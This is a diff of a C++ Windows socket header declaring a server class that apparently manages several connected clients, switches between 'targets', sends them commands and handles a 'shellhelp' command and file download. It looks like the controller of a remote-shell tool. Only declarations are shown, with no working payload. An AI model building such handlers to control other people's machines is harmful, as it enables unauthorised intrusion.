@@ -6,16 +6,19 @@
 #include <WS2tcpip.h>
 #include <iostream>
 #include <string>
+#include <sstream>
 #include <cstdio>
 #include <cstdlib>
 #include <thread>
 #include <chrono>
+#include <tchar.h>
+#include <strsafe.h>
 #define BUFFER_SIZE (2048)
 
 
-//TODO: create different stuct for server and client
 struct Commands
 {
+    // SERVER CUSTOM COMMAND FUNCTIONS
     void print_help();
     void clear_screen();
     void download(char* filefrom, char* fileto);
@@ -30,39 +33,54 @@ struct Commands
 class Server : Commands
 {
 public:
-    Server(const char* port);
-    void handler_print_help();
-    int quit_gracefully();
+    const char* lport;
+
+public:
+    // SOCKET
     void initialize();
     void create_socket();
     void bind_socket();
     void accept_connections();
+    int quit_gracefully();
+
+    // HANDLER
     void start_handler();
+    void handler_print_help();
     void list_connections();
     bool change_target(unsigned short int target);
-    //void read_command_output();
-    //void recvall();
-    void send_commands();
 
+    // MAIN
+    BOOL OnSocketOutput();
+    BOOL ReadFromSocket();
+    int send_commands();
 
-private: // VARIABLES
+private:
+    // SOCKET INFO
     WSADATA wsaData;
-    struct addrinfo* AddrInfo = NULL;
+    struct addrinfo* AddrInfo;
     struct addrinfo hints;
-    
+
+    // SOCKET CREATE
     SOCKET ListenSocket = INVALID_SOCKET;
     SOCKET ClientSocket = INVALID_SOCKET;
 
+    // DATA
     int iResult;
     int iSendResult;
     char rdata[BUFFER_SIZE];
-    LPCTSTR rdata_rd;
+    char inputUser[BUFFER_SIZE];
+    DWORD dwSockRead;
+    DWORD dwSockWrite;
+    BOOL bRunning;
+    HANDLE hProcRead;
+    HANDLE hProcWrite;
 
-    const char* lport;
+    // VECTORS
     std::vector<SOCKET> all_connections;
-    std::vector<std::string> all_addresses;
+    std::vector<std::vector<LPCSTR>> all_addresses;
 
-private: // COMMAND LOOKUP
+private: 
+    // COMMAND LOOKUP
     template <typename T>
     static std::unordered_map <std::string, T> command_lookup = {
         {"shellhelp", print_help },
